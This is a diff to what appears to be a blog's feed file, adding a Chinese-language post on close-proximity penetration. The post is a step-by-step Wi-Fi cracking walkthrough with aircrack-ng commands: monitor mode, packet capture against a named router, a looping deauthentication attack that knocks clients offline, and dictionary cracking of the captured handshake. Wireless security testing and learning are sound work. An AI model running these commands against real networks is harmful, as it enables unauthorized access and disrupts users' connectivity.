@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>近源渗透</title>
+    <link href="/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/"/>
+    <url>/2023/09/02/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/</url>
+    
+    <content type="html"><![CDATA[<h1 id="近源渗透"><a href="#近源渗透" class="headerlink" title="近源渗透"></a>近源渗透</h1><h2 id="一-wifi破解"><a href="#一-wifi破解" class="headerlink" title="一.wifi破解"></a>一.wifi破解</h2><ol><li><p>列出可用无线网卡</p><p><code>airmon-ng</code></p><p>![image-20230902125854051](..&#x2F;..&#x2F;..&#x2F;..&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230902125854051.png)</p></li><li><p>开启网卡监控</p><p><code>airmon-ng check kill</code></p><p><code>airmon-ng start wlan0</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021301071.png" alt="image-20230902130113036"></p></li><li><p>扫描wifi</p><blockquote><p>wlan0开启网卡监控后查看重新名称是否修改，ifconfig</p><p>可能会变成wlan0mon</p><p><strong>关键点：</strong></p><ul><li><p><strong>·BSSID：网卡MAC地址，</strong></p></li><li><p><strong>·CH：信道通道(频道)，</strong></p></li><li><p><strong>·ESSID：Wifi名称，</strong></p></li><li><p><strong>·STATION：可理解为连接着这个网络的某一台手机的MAC地址</strong></p></li></ul><p> <strong>.PWR：信号强弱程度，数值越小信号越强；</strong></p><p> <strong>.DATA：数据量，越大使用的人就越多</strong></p></blockquote><p><code>airmon-ng start wlan0</code> </p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021331489.png" alt="image-20230902133126443"></p></li><li><p>抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng -w wifi -c 11 --bssid 64:64:4A:B3:B4:56 wlan0 <br><br>    -c：指定信道<br>     -w：保存数据包名<br>     --bssid：指定路由器的MAC<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021352164.png" alt="image-20230902135235126"></p></li><li><p>wifi攻击，打断重连获取握手包(可选)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng -0 0 -c BC:D0:74:1E:2B:1D -a 64:64:4A:B3:B4:56 wlan0<br><br>-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）<br>-a：指定路由器的MAC<br>-c：指定客户机的MAC<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021404818.png" alt="image-20230902140416760"></p></li><li><p>暴力破解(撞库)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng  -w  /home/parallels/Desktop/pass wifi-09.cap<br>-w 破解字典<br></code></pre></td></tr></table></figure><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202309021407583.png" alt="image-20230902140752535"></p></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>note</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>python实现sql中转注入</title>
     <link href="/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/"/>
     <url>/2022/12/12/python%E5%AE%9E%E7%8E%B0sql%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5/</url>
